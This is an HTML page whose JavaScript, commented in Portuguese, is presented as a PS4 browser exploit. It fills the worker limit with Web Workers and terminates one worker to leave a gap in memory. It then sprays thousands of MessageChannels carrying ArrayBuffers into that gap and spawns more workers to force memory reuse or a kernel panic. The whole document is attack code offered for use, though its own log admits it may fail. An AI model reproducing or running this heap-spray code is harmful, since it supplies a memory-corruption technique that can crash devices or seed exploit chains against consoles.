<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Slot Reclaiming Exploit</title>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; padding: 20px; text-align: center; }
        #counter { font-size: 100px; font-weight: bold; margin: 30px 0; }
        #status { font-size: 24px; border: 1px solid #333; padding: 10px; margin-bottom: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; cursor: pointer; background: #b30000; color: #fff; border: none; }
    </style>
</head>
<body>

    <div id="status">AGUARDANDO...</div>
    <div id="counter">0</div>
    
    <button onclick="runSwapExploit()">INICIAR "THE SWAP" (418 -> Vítima)</button>

    <script>
        // CONFIGURAÇÕES
        const TARGET_LIMIT = 410; // Um a menos que o crash (418)
        
        let workers = [];
        let victimStore = []; // Onde guardamos os objetos vítima

        // Worker Mínimo
        const workerCode = `postMessage("ready");`;
        const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));

        function log(msg) {
            document.getElementById('status').innerText = msg;
        }

        function updateDisplay() {
            document.getElementById('counter').innerText = workers.length;
        }

        function runSwapExploit() {
            log("FASE 1: Enchendo até a borda (417)...");
            
            let fillInterval = setInterval(() => {
                if (workers.length < TARGET_LIMIT) {
                    let w = new Worker(url);
                    w.onmessage = () => {};
                    workers.push(w);
                    updateDisplay();
                } else {
                    clearInterval(fillInterval);
                    performTheSwap();
                }
            }, 20);
        }

        function performTheSwap() {
            log("FASE 2: PREPARANDO O TIRO...");
            document.body.style.backgroundColor = "#331a00"; // Laranja escuro

            // Criamos a thread 418 (O alvo que vai morrer)
            let targetWorker = new Worker(url);
            targetWorker.onmessage = () => {};
            workers.push(targetWorker);
            updateDisplay(); // Mostra 418

            setTimeout(() => {
                log("FASE 3: EXECUTANDO A TROCA (KILL -> SPRAY -> SPAWN)");
                document.body.style.backgroundColor = "#b30000"; // Vermelho
                
                // === A MÁGICA ACONTECE AQUI ===
                
                // 1. Mata a thread 418 (Cria o "Buraco" na memória)
                targetWorker.terminate();
                
                // 2. Tenta "Forçar GC" e Spray (Preencher o buraco com vítimas)
                // Criamos MessageChannels, que usam portas IPC no Kernel
                try {
                    for(let i=0; i<4000; i++) {
                        let ch = new MessageChannel();
                        // Guardamos referência para não ser limpo
                        victimStore.push(ch); 
                        // Enviamos dados para forçar alocação
                        ch.port1.postMessage(new ArrayBuffer(128)); 
                    }
                } catch(e) {}

                // 3. Tenta criar a thread 419 (Para triggerar o reuso ou o panic)
                // Se o buraco foi preenchido pelo MessageChannel, isso deve causar
                // um erro bizarro ou um crash diferente.
                for(let k=0; k<10; k++) {
                   let w = new Worker(url);
                   workers.push(w);
                }
                
                updateDisplay();
                log("ATAQUE REALIZADO. Se não desligou, falhou.");
                
            }, 500); // Pequena pausa para garantir que a 418 foi criada
        }
    </script>
</body>
</html>

